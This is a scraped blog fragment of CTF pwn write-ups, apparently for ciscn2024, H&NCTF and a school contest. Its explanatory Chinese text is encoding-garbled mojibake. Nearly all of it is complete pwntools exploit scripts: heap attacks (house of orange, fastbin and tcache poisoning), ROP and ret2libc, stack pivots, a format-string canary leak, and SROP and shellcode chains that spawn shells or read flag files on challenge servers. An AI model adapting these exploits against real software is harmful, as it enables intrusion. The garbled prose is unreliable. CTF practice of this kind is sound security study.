&lt;p&gt;2.23çš„libcï¼Œæ— é™åˆ¶çš„addå’Œeditï¼Œshowå’Œfreeåªæœ‰ä¸€æ¬¡ï¼Œå¹¶ä¸”åªèƒ½å¯¹æ–°ç”³è¯·çš„chunkè¿›è¡Œæ“ä½œï¼Œå­˜åœ¨8å­—èŠ‚æº¢å †å‡ºå’Œuafæ¼æ´ï¼Œé¢˜ç›®æç¤ºæ‰“house of orangeï¼Œå †è¦†ç›–åˆ°top chunkå°†å…¶åªä¿ç•™åä¸‰ä½ï¼ˆåå…­è¿›åˆ¶ï¼‰ï¼Œç„¶åç”³è¯·ä¸€ä¸ª0x1000çš„å †ï¼Œtop chunkå°±ä¼šåˆ°unsorted binä¸­ï¼Œå¯å€Ÿæ­¤æ³„éœ²libcåœ°å€ï¼Œç„¶ååˆ©ç”¨uafå’Œå”¯ä¸€çš„ä¸€æ¬¡freeæœºä¼šä¿®æ”¹fastbinçš„fdæŒ‡é’ˆï¼Œç”³è¯·åˆ°malloc_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
p = process(&#39;./orange_cat_diary&#39;)
elf = ELF(&#39;./orange_cat_diary&#39;)
libc = elf.libc

def add(size,content=&amp;quot;name&amp;quot;):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, &amp;quot;1&amp;quot;)
	p.sendlineafter(&amp;quot;content:&amp;quot;, str(size))
	p.sendafter(&amp;quot;content:\n&amp;quot;, content)
	
def show():
	p.sendlineafter(&amp;quot;choice:&amp;quot;, &amp;quot;2&amp;quot;)
    	
def dele():
	p.sendlineafter(&amp;quot;choice:&amp;quot;, &amp;quot;3&amp;quot;)

def edit(size,content):
	p.sendlineafter(&amp;quot;choice:&amp;quot;, &amp;quot;4&amp;quot;)
	p.sendlineafter(&amp;quot;content:&amp;quot;, str(size))
	p.sendlineafter(&amp;quot;content:\n&amp;quot;, content)

p.sendafter(&#39;name.\n&#39;,b&#39;name&#39;)

gdb.attach(p,&amp;quot;bp $rebase(0xEDA)&amp;quot;)
add(0x18)
edit(32,b&#39;a&#39;*0x18+p64(0xfe1))
add(0x1000)
add(0x10,b&#39;\x78&#39;)
show()
p.recvuntil(&#39;\x7f&#39;)
main_arena = u64(p.recvuntil(&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;)) - 88
libc_base = main_arena + 88 - 3953032
print(&amp;quot;libc_base = &amp;quot;,hex(libc_base))

malloc_hook = main_arena - 0x10 - 1536 - 16
print(&amp;quot;malloc_hook = &amp;quot;,hex(malloc_hook))
onegadget = [0x4527a,0xf03a4,0xf1247]
one_gadget = libc_base + onegadget[1]

add(0x68)
dele()
edit(0x68,p64(malloc_hook-35))
add(0x68)
add(0x68,b&#39;\x00&#39;*19 + p64(one_gadget))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ezbuf&#34;&gt;ezbuf&lt;/h1&gt;
&lt;p&gt;protobufçš„æ¿å­é¢˜ï¼ˆé«˜ç‰ˆæœ¬double free,æ³¨æ„tcacheå †å—éœ€è¦æœ«å°¾æŸ0å¯¹é½ï¼‰ï¼Œ2.35çš„libcï¼Œåªå…è®¸10æ¬¡freeå’Œ2æ¬¡çš„showä¸”é™åˆ¶çš„addå¤§å°ä¸º0x30ï¼ˆchunkå¤§å°ä¸º0x40ï¼‰ï¼ŒåŠ¨æ€è°ƒè¯•+åˆ†æåè®®ï¼ˆè¯¦æƒ…è§å¦ä¸€ç¯‡ä»‹ç»protobufçš„æ–‡ç« ï¼‰åå‘ç°åœ¨è§£åŒ…æ—¶ä¼šåˆ›å»ºä¸¤ä¸ªå †å—ï¼Œç¬¬ä¸€ä¸ªæ˜¯å›ºå®š0x50å¤§å°ï¼Œå¦ä¸€ä¸ªæ˜¯å‚¨å­˜contentçš„å †å—ï¼Œæ ¹æ®å…¶å¤§å°åˆ†é…çš„å †å—ï¼ˆç›¸å½“äºå¤šäº†ä¸€ä¸ªaddåŠŸèƒ½ï¼Œä¸”ä¸é™åˆ¶å¤§å°ï¼‰&lt;/p&gt;
&lt;h2 id=&#34;æ”»å‡»æ€è·¯&#34;&gt;æ”»å‡»æ€è·¯&lt;/h2&gt;
&lt;p&gt;è¯¥é¢˜ä½¿ç”¨çš„æ˜¯_exit(0)é€€å‡ºç¨‹åºï¼Œæ— æ³•æ”»å‡»IOï¼Œæ‰€ä»¥æ‰“å †æ ˆç»“åˆï¼Œåˆ©ç”¨fastbin double freeåŠ«æŒtcache_perthread_structä¸­å‚¨å­˜0xf0å¤§å°çš„chuanké“¾è¡¨å¤´ï¼Œä¿®æ”¹ä¸ºtcache_perthread_structçš„åœ°å€ï¼Œä»è€ŒåŠ«æŒtcache_perthread_structï¼Œå°±å¯ä»¥ç”³è¯·åˆ°ä»»æ„åœ°å€å †å—ï¼Œå‰é¢æ³„éœ²å †åœ°å€å’Œlibcåœ°å€æ—¶å·²ç»ç”¨äº†ä¸¤æ¬¡showäº†ï¼Œæ‰€ä»¥é€šè¿‡åŠ«æŒstdoutç»“æ„ä½“æ³„éœ²æ ˆåœ°å€ï¼Œæœ€åå¸ƒç½®ropé“¾åˆ°æ ˆä¸Šï¼ˆåŠ«æŒçš„æ˜¯sub_1C87å‡½æ•°çš„è¿”å›åœ°å€ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
import heybro_pb2

p = process(&amp;quot;./pwn&amp;quot;)
#p = remote(&amp;quot;pwn.challenge.ctf.show&amp;quot;,28127)
elf = ELF(&amp;quot;./pwn&amp;quot;)
remote_libc = ELF(&amp;quot;./libc.so.6&amp;quot;)
local_libc = ELF(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)
libc = remote_libc

context.log_level = &#39;debug&#39;
#context.terminal = [&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]

def create(idx,content):
    data = heybro_pb2.heybro()
    data.whattodo = 1
    data.whatcon = content
    data.whatidx = idx
    data.whatsize = 0
    data.whatsthis = 0
    data = data.SerializeToString()
    p.recvuntil(b&#39;WANT?\n&#39;)
    p.send(data)
 
def delete(idx):
    data = heybro_pb2.heybro()
    data.whattodo = 2
    data.whatcon = b&#39;0&#39;
    data.whatidx = idx
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b&#39;WANT?\n&#39;)
    p.send(data)
 
def show(idx):
    data = heybro_pb2.heybro()
    data.whattodo = 3
    data.whatcon = b&#39;0&#39;
    data.whatidx = idx
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b&#39;WANT?\n&#39;)
    p.send(data)
 
def do_nothing(content):
    data = heybro_pb2.heybro()
    data.whattodo = 0
    data.whatcon = content
    data.whatidx = 1
    data.whatsize = 1
    data.whatsthis = 1
    data = data.SerializeToString()
    p.recvuntil(b&#39;WANT?\n&#39;)
    p.send(data)    

#gdb.attach(p,&amp;quot;b *$rebase(0x0000000000001AD1)&amp;quot;)
for i in range(9):
	create(i,b&#39;aaaaaaaa&#39;)
show(0)
p.recvuntil(b&#39;aaaaaaaa&#39;)
libc_base = u64(p.recv(6).ljust(8,b&#39;\x00&#39;)) - 2206944
print(&amp;quot;libc_base&amp;quot;,hex(libc_base))
delete(0)
show(0)
p.recvuntil(b&#39;:&#39;)
heap = u64(p.recv(5).ljust(8,b&#39;\x00&#39;))&amp;lt;&amp;lt;12
heap_base = heap - 0x2000
key = heap_base &amp;gt;&amp;gt; 12
print(&amp;quot;heap_base&amp;quot;,hex(heap_base))
for i in range(1,7):
	delete(i)
delete(7)
delete(8)
delete(7)
for i in range(7):
	create(i,b&#39;aaaaaaaa&#39;)
print(&amp;quot;key&amp;quot;,hex(key))

environ = libc_base + libc.sym[&#39;environ&#39;]
stdout = libc_base + libc.sym[&#39;_IO_2_1_stdout_&#39;]

create(7,p64((heap_base+0xf0)^((heap_base+0x004e40)&amp;gt;&amp;gt;12)))
create(0,b&#39;aaaaaaaa&#39;)
create(0,b&#39;aaaaaaaa&#39;)
create(0,p64(0) + p64(heap_base + 0x10))

payload  = p16(0)*2+p16(1)+p16(0)+p16(0)*5+p16(1)
payload  = payload.ljust(0x80,b&#39;\x00&#39;)

payload += p64(0)*2+p64(stdout)+p64(0)+p64(0)*5+p64(heap_base+0x10)
payload  = payload.ljust(0xe0,b&amp;quot;\x00&amp;quot;)
do_nothing(payload)

payload1 = p64(0xfbad1800) + p64(0)*3 + p64(environ) + p64(environ + 8)
do_nothing(payload1)
leak = u64(p.recv(6).ljust(8,b&#39;\x00&#39;))
stack_addr = leak - 0x1a8 + 0x40
print(&amp;quot;stack_addr&amp;quot;,hex(stack_addr))

pay  = p16(0)*4 + p16(1)
pay  = pay.ljust(0x80,b&#39;\x00&#39;)

pay += p64(0)*4 + p64(stack_addr)
pay  = pay.ljust(0xa0,b&amp;quot;\x00&amp;quot;)
do_nothing(pay)
gdb.attach(p)

pop_rdi = 0x2a3e5 + libc_base
system = libc.sym[&#39;system&#39;] + libc_base
binsh = next(libc.search(b&amp;quot;/bin/sh\x00&amp;quot;)) + libc_base
ret = 0x2a3e6 + libc_base
payload = cyclic(8) + p64(ret) +  p64(pop_rdi) + p64(binsh) + p64(system)
payload = payload.ljust(0x58,b&#39;\x00&#39;)
do_nothing(payload)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">ciscn2024</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/handnctf/"" data-c="
          &lt;h1 id=&#34;close&#34;&gt;close&lt;/h1&gt;
&lt;p&gt;æœ¬æ ¡æ–°ç”Ÿèµ›å‡ºè¿‡ï¼ŒæŠŠè¾“å‡ºé‡å®šå‘åˆ°è¾“å…¥ç§’äº†&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;exec 1&amp;gt;&amp;amp;0
cat flag
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;what&#34;&gt;what&lt;/h1&gt;
&lt;p&gt;2.27çš„libcï¼Œuafæ”¹malloc_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./what&amp;quot;)
p = remote(&amp;quot;hnctf.imxbt.cn&amp;quot;,29947)
elf = ELF(&amp;quot;./what&amp;quot;)

def add(size):
	p.recvuntil(&amp;quot;command:\n&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;size:\n&amp;quot;)
	p.sendline(str(size))
    
def dele():
	p.recvuntil(&amp;quot;command:\n&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)

	
def edit(size,string):
	p.recvuntil(&amp;quot;command:\n&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(&amp;quot;idx:\n&amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;content:\n&amp;quot;)
	p.sendline(string)
	
def show(idx):
	p.recvuntil(&amp;quot;command:\n&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;idx:\n&amp;quot;)
	p.sendline(str(idx))

def exit():
	p.recvuntil(&amp;quot;choice\n&amp;quot;)
	p.sendline(&amp;quot;5&amp;quot;)
	
add(1060)#0
add(24)#1
add(24)#2
dele()
dele()
dele()
show(0)
base = u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;)) - 4111520
print(&amp;quot;base = &amp;quot;,hex(base))
onegadget = [0x4f29e,0x4f2a5,0x4f302,0x10a2fc]
one_gadget = base + onegadget[3]

edit(1,p64(base+4111408))

add(24)#0
add(24)#1
edit(1,p64(one_gadget))
#gdb.attach(p)
p.recvuntil(&amp;quot;command:\n&amp;quot;)
p.sendline(&amp;quot;1&amp;quot;)
p.recvuntil(&amp;quot;size:\n&amp;quot;)
p.sendline(str(24))

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;ez_pwn&#34;&gt;ez_pwn&lt;/h1&gt;
&lt;p&gt;32ä½çš„æ ˆè¿ç§»ï¼Œé¢˜æœ¬èº«ä¸éš¾ï¼Œæ ˆæº¢å‡ºä¸€ä¸ªebpçš„å¤§å°ï¼Œä½†æ˜¯32ä½çš„åšçš„é¢˜å¤ªå°‘äº†ï¼Œé”™è¯¯é¢‘å‡ºï¼Œæ³¨æ„ä¸¤ç‚¹ï¼š1.&amp;quot;/bin/sh\x00&amp;quot;å­—ç¬¦ä¸²çš„ä½ç½®åº”æ”¾åœ¨è°ƒç”¨systemå‡½æ•°ä¹‹åï¼Œä¸ç„¶æ‰§è¡Œå‡½æ•°æ—¶å®¹æ˜“æŠŠå­—ç¬¦ä¸²è¦†ç›–æ‰&lt;br&gt;
2.systemçš„pltè¡¨å’Œsystemçš„å‚æ•°ä¹‹é—´åº”è¯¥æœ‰å››ä¸ªå­—èŠ‚å……å½“fake ebp&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

flag=0
if flag==1:
	p = process(&amp;quot;./pwn&amp;quot;)
	gdb.attach(p)
else:
	p = remote(&amp;quot;hnctf.imxbt.cn&amp;quot;,50025)

pay = b&#39;a&#39;*44
p.sendafter(&amp;quot;name?\n&amp;quot;,pay)

plt = 0x8048400
sys = 0x804857B

base = u32(p.recvuntil(&amp;quot;\xff&amp;quot;)[-4:])
print(&amp;quot;base = &amp;quot;,hex(base))

#payload =  p32(0)*4 + p32(0x8048400) + p32(0) + p32(base-28) + b&#39;cat flag&#39; + p32(0)*2 + p32(base-44)
payload =  p32(0)*4 + p32(0x8048400) + p32(0) + p32(base-28) + b&#39;/bin/sh\x00&#39; + p32(0)*2 + p32(base-44)

p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;idea&#34;&gt;idea&lt;/h1&gt;
&lt;p&gt;32ä½çš„ret2libcï¼Œå¼€äº†canaryï¼Œé€šè¿‡æ•´æ•°æº¢å‡ºæœ‰ä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²å¯ä»¥æ³„éœ²canary&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
#p = process(&#39;./pwn&#39;)
elf = ELF(&#39;./idea&#39;)
lib = ELF(&#39;./libc-2.23.so&#39;)
p = remote(&#39;hnctf.imxbt.cn&#39;, 56459)

p.recvuntil(b&#39;?&#39;)
p.sendline(b&#39;-1&#39;)
p.recvuntil(b&#39;!&#39;)
p.sendline(b&#39;%7$p&#39;)
p.recvuntil(b&#39;0x&#39;)
canary = int(p.recv(8), 16)
p.recvuntil(b&#39;!&#39;)
payload = b&#39;a&#39; * 32 + p32(canary) + p32(0) * 3 + p32(elf.plt[&#39;puts&#39;]) + p32(elf.sym[&#39;main&#39;]) + p32(elf.got[&#39;puts&#39;])
p.sendline(payload)
base_addr = u32(p.recvuntil(b&#39;\xf7&#39;)[-4:]) - lib.sym[&#39;puts&#39;]
print(hex(base_addr))

system = base_addr + lib.sym[&#39;system&#39;]
binsh = base_addr + next(lib.search(b&#39;/bin/sh&#39;))
p.recvuntil(b&#39;?&#39;)
p.sendline(b&#39;-1&#39;)
p.recvuntil(b&#39;!&#39;)
p.sendline(b&#39;%7$p&#39;)
p.recvuntil(b&#39;!&#39;)
payload = b&#39;a&#39; * 32 + p32(canary) + p32(0) * 3 + p32(system) + p32(elf.sym[&#39;main&#39;]) + p32(binsh)
p.sendline(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
">H&NCTF</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/tut-xiao-sai/"" data-c="
          &lt;p&gt;é˜Ÿå‹å¤ªå¼ºäº†ï¼Œå¸¦æˆ‘åº“åº“ä¸Šåˆ†ğŸ˜&lt;/p&gt;
&lt;h1 id=&#34;ezrop&#34;&gt;ezrop&lt;/h1&gt;
&lt;p&gt;pwnç­¾åˆ°é¢˜ï¼Œret2libc&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&#39;./ezrop&#39;)
p = remote(&amp;quot;36.212.170.17&amp;quot;,9997)
elf = ELF(&#39;./ezrop&#39;)

puts_plt = 0x401060
puts_got = 0x403FD8
main_addr = 0x401222
pop_rdi_ret = 0x401183
ret = 0x40101a

#gdb.attach(p)

payload = b&#39;a&#39;*144 + p64(0x404500) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(&amp;quot;time\n&amp;quot;,payload)

puts_addr=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

libc_base = puts_addr - 0x80E50
system_addr = libc_base + 0x50D70
bin_addr = libc_base + 0x1D8678
onegadget = [0xebc81,0xebc85,0xebc88,0xebce2,0xebd38,0xebd3f,0xebd43]
one_gadget = libc_base + onegadget[5]#3 4 

print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

#gdb.attach(p)
#pause()
pay = b&#39;b&#39;*144 + p64(0x404220) + p64(one_gadget) #+ p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.sendlineafter(&amp;quot;time\n&amp;quot;,pay)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;orw2&#34;&gt;orw*2&lt;/h3&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1715003872143.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;å¼€äº†æ²™ç›’æ‰“orw&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;2&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1715003881364.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;ç™½ç»™äº†æ ˆåœ°å€å’Œlibcåœ°å€&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;3&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1715003888411.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;p&gt;æŸ¥çœ‹ä¸»é€»è¾‘å‘ç°å­˜åœ¨æ ˆæº¢å‡ºï¼Œå› ä¸ºå·²çŸ¥æ ˆåœ°å€ï¼Œæ‰€ä»¥å¯ä»¥æŠŠæ ˆè¿ç§»åˆ°è¾“å…¥çš„å†…å®¹ä¸Šï¼Œè¿˜æœ‰ä¸€ç‚¹å°±æ˜¯å¼€äº†canaryï¼Œéœ€è¦åœ¨canaryçš„ä½ç½®è¾“å…¥+å·é˜²æ­¢æ”¹å˜canaryï¼Œå†æœ‰å°±æ˜¯è¦ä»¥doubleå½¢å¼è¾“å…¥ï¼Œæ³¨æ„flag.txtçš„æˆªæ–­é—®é¢˜(æ ¼å¼è½¬æ¢æœ‰ç‚¹ä¸‘ï¼Œè½»ç‚¹éª‚)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)
import struct

#p = process(&#39;./oorrww&#39;)
p = remote(&amp;quot;36.212.170.17&amp;quot;,9998)
elf = ELF(&#39;./oorrww&#39;)

#gdb.attach(p)
re = p.recvuntil(b&#39;!&#39;, drop = True).split()
print(&amp;quot;re =&amp;quot;,re)
num11 = float(re[5])
num1 = struct.unpack(&#39;&amp;lt;Q&#39;, struct.pack(&#39;&amp;lt;d&#39;, num11))[0]
stack = int(hex(num1),16)
print(&amp;quot;stack =&amp;quot;,hex(stack))

binary_data = struct.pack(&#39;&amp;gt;Q&#39;, stack)
stack1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, stack+8)
stack2 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, stack+8*13)
stack3 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

num22 = float(re[6])
num2 = struct.unpack(&#39;&amp;lt;Q&#39;, struct.pack(&#39;&amp;lt;d&#39;, num22))[0]
scanf = int(hex(num2),16)
base = scanf - 0x62090
print(&amp;quot;base =&amp;quot;,hex(base))

leave = base + 0x4da83
print(&amp;quot;leave =&amp;quot;,hex(leave))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, leave)
leave1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

rdi = base + 0x2a3e5
print(&amp;quot;rdi =&amp;quot;,hex(rdi))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, rdi)
rdi1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

rsi = base + 0x2be51
print(&amp;quot;rsi =&amp;quot;,hex(rsi))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, rsi)
rsi1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

rdx_rcx_rbx = base + 0x108b03
print(&amp;quot;rdx_rcx_rbx =&amp;quot;,hex(rdx_rcx_rbx))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, rdx_rcx_rbx)
rdx_rcx_rbx1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

ope = base + 0x1144E0
print(&amp;quot;ope =&amp;quot;,hex(ope))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, ope)
ope1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

read = base + 0x1147D0
print(&amp;quot;read =&amp;quot;,hex(read))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, read)
read1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

write = base + 0x114870
print(&amp;quot;write =&amp;quot;,hex(write))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, write)
write1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

puts = base + 0x80E50
print(&amp;quot;puts =&amp;quot;,hex(puts))
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, puts)
puts1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

binary_data = struct.pack(&#39;&amp;gt;Q&#39;, 0)
_0 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, 1)
_1 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, 3)
_3 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, 0x100)
_100 = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]
binary_data = struct.pack(&#39;&amp;gt;Q&#39;, stack - 0x100)
bss = struct.unpack(&#39;&amp;gt;d&#39;, binary_data)[0]

#orw
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(1.1205295609968026e+253))#bp  flag.txt
p.sendlineafter(&amp;quot;input:\n&amp;quot;,b&amp;quot;0&amp;quot;)
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rdi1))#rdi
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(stack3))#flag
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rsi1))#rsi
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(_0))#0
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(ope1))#open
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rdi1))#rdi
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(_3))#3
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rsi1))#rsi
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(bss))#bss
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rdx_rcx_rbx1))#rdx
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(_100))#0x100
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(1.1205295609968026e+253))#0
p.sendlineafter(&amp;quot;input:\n&amp;quot;,b&amp;quot;0&amp;quot;)#0
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(read1))#read
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(rdi1))#rdi
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(_1))#1
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(write1))#write

p.sendlineafter(&amp;quot;input:\n&amp;quot;,b&amp;quot;+&amp;quot;)
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(stack2))#stack
pause()
p.sendlineafter(&amp;quot;input:\n&amp;quot;,str(leave1))#leave

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h1 id=&#34;sp&#34;&gt;sp&lt;/h1&gt;
&lt;p&gt;ç›¸å½“äºxyctfçš„sropå’Œinviisible_flagï¼ˆç¦ç”¨äº†orwçš„orwï¼‰ï¼Œæ¯”èµ›æ—¶æŠŠsyscallåœ°å€ç»™æé”™äº†ğŸ¤¡ï¼Œåˆ°é‚£å°±æŒ‚ï¼Œæµ‹ï¼åœ¨xyçš„sropä»£ç åŸºç¡€ä¸Šç¨å¾®æ”¹æ”¹å°±å‡ºäº†ï¼ˆé˜Ÿä¼çš„æ¶äººï¼‰,&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./sp&amp;quot;)
p = remote(&amp;quot;36.212.170.17&amp;quot;,9999)
elf = ELF(&amp;quot;./sp&amp;quot;)
syscall = 0x4010B0
bss = 0x404260+0x500
rdi = 0x4012ec
leave = 0x4012e2

#gdb.attach(p)
sigframe = SigreturnFrame()
sigframe.rax = 0
sigframe.rdi = 0
sigframe.rsi = 0
sigframe.rdx = bss
sigframe.rcx = 0x800
sigframe.rsp = bss + 16
sigframe.rbp = bss + 0x800
sigframe.rip = syscall

payload = b&amp;quot;a&amp;quot;*24 + p64(bss) + p64(0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

#pause()
flag = bss
sigframe0 = SigreturnFrame()
sigframe0.rdi = constants.SYS_openat
sigframe0.rsi = -100
sigframe0.rdx = flag
sigframe0.rcx = 0
sigframe0.rsp = bss + 0x10 + 256 + 16
sigframe0.rip = syscall

sigframe1 = SigreturnFrame()
sigframe1.rdi = constants.SYS_read
sigframe1.rsi = 3
sigframe1.rdx = bss - 0x100
sigframe1.rcx = 50
sigframe1.rsp = bss + 0x10 + 256*2 + 24 + 8
sigframe1.rip = syscall


sigframe2 = SigreturnFrame()
sigframe2.rdi = constants.SYS_sendfile
sigframe2.rsi = 1
sigframe2.rdx = 3
sigframe2.rcx = 0
sigframe2.r8 = 50
sigframe2.rsp = bss + 0x10 + 256*3
sigframe2.rip = syscall

pay = b&amp;quot;flag.txt&amp;quot; + p64(0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe0) + p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2) #+ p64(rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2)
p.send(pay)
p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ä¸‹é¢æ˜¯mprotect+shellcodeçš„åšæ³•&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

#p = process(&amp;quot;./sp&amp;quot;)
p = remote(&amp;quot;36.212.170.17&amp;quot;,9999)
elf = ELF(&amp;quot;./sp&amp;quot;)

#gdb.attach(p)
pop_rdi = 0x4012ec
syscall = elf.plt[&#39;syscall&#39;]
sigframe = SigreturnFrame()
sigframe.rdi = 0
sigframe.rsi = 0
sigframe.rdx = 0x404300
sigframe.rcx = 0x300
sigframe.rbp = 0x404400
sigframe.rsp = 0x404300
sigframe.rip = syscall

payload = b&#39;a&#39; * 0x28 + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

sigframe2 = SigreturnFrame()
sigframe2.rdi = 10
sigframe2.rsi = 0x404000
sigframe2.rdx = 0x1000
sigframe2.rcx = 7
sigframe2.rsp = 0x404410
sigframe2.rbp = 0x404500
sigframe2.rip = syscall

shellcode = shellcraft.openat(-100, &#39;flag.txt&#39;, 0, 0)
shellcode += shellcraft.sendfile(1, 3, 0, 50)
shellcode = asm(shellcode)

#pause()
payload = p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe2) + p64(pop_rdi) + p64(0xf) + p64(syscall) + bytes(sigframe)
p.send(payload)

#pause()
payload = p64(0x404308) + shellcode
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
